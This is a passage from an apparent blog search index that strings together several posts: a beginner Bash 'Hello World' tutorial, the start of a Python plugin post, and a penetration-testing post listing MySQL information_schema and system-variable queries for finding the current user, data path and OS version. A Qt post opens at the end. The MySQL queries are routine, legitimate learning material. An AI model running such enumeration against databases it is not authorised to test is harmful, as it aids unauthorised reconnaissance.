prompt. Generally speaking, Bash scripts have an optional extension of.sh (for ease of identification), begin with #!&#x2F;bin&#x2F;bash and must have executable permissions setbefore they can be executed. Let’s begin with a simple “Hello World” Bash script, file named hello-world.sh: 123#!/bin/bash# Hello World Bash Scriptecho &quot;Hello World!&quot; This script has several components worth explaining:• Line 1: #! is commonly known as the shebang, and is ignored by the Bash interpreter. Thesecond part, &#x2F;bin&#x2F;bash, is the absolute path to the interpreter, which is used to run thescript. This is what makes this a “Bash script” as opposed to another type of shell script, likea “C Shell script”, for example.• Line 2: # is used to add a comment, so all text that follows it is ignored.• Line 3: echo “Hello World!” uses the echo Linux command utility to print a given string to theterminal, which in this case is “Hello World!”. Next, let’s make the script executable and run it: 123kali@kali:~$ chmod +x hello-world.shkali@kali:~$ ./hello-world.shHello World! The chmod command, along with the +x option is used to make the script executable..&#x2F;helloworld.sh is used to actually run it.The .&#x2F; notation may seem confusing but this is simply a pathnotation indicating that this script is in the current directory. Whenever we type a command, Bashtries to find it in a series of directories stored in a variable called PATH. Since our home directoryis not included in that variable, we must use the relative path to our Bash script in order for Bashto “find it” and run it. Now that we have created our first Bash script,next we will explore Bash in a bit more detail.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 01 - Intro to Bash Scripting","slug":"Bash/Bash-Scripting-01-Intro-to-Bash-Scripting","permalink":"http://example.com/categories/Bash/Bash-Scripting-01-Intro-to-Bash-Scripting/"}],"tags":[]},{"title":"A Simple Plugin System by Python","slug":"SimplePluginSystemByPython","date":"2011-10-22T20:41:33.000Z","updated":"2023-10-18T21:50:41.991Z","comments":true,"path":"2011/10/22/SimplePluginSystemByPython/","link":"","permalink":"http://example.com/2011/10/22/SimplePluginSystemByPython/","excerpt":"","text":"Due to the requirements of my work, I needed to design an open software system, and immediately thought of the Python language.

It serves as an interface for querying metadata information in MySQL. This information is stored in tabular form within tables in the “information_schema” database, and users can retrieve metadata information by using SQL statements to query these tables. Here are some common tables in the ‘information_schema’ database: SCHEMATA: Stores information about all databases, including database names, character sets, etc. TABLES: Stores information about all tables, including table names, table types, engines, etc. COLUMNS: Stores information about all columns, including column names, column data types, column constraints, etc. STATISTICS: Stores information about all indexes, including index names, index types, the table where the index is located, index columns, etc. USER_PRIVILEGES: Stores information about user privileges, including user accounts, permissions, etc. By querying the tables in the information_schema database, you can obtain information about various aspects of databases, tables, columns, indexes, users, and permissions. This is very helpful for database management and maintenance. Next, let’s take a look at an example of finding key information through the information_schema database: Query information about the current user:1SELECT current_user(); Query information about the user for the current session:1SELECT session_user(); Get the path of the database:1SELECT @@datadir; Get the installation path of MySQL:1select @@basedir; Retrieve information about the operating system version:1SELECT @@version_compile_os;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"About information_schema","slug":"Penetration-Test/MySQL/About-information-schema","permalink":"http://example.com/categories/Penetration-Test/MySQL/About-information-schema/"}],"tags":[]},{"title":"In Qt, how to transmit custom data using QAction::setData","slug":"QtSetData","date":"2010-05-02T03:16:09.000Z","updated":"2023-10-24T01:54:43.350Z","comments":true,"path":"2010/05/01/QtSetData/","link":"","permalink":"http://example.com/2010/05/01/QtSetData/","excerpt":"","text":"Recently, in a project, there was a need to transmit custom data using QAction::setData.
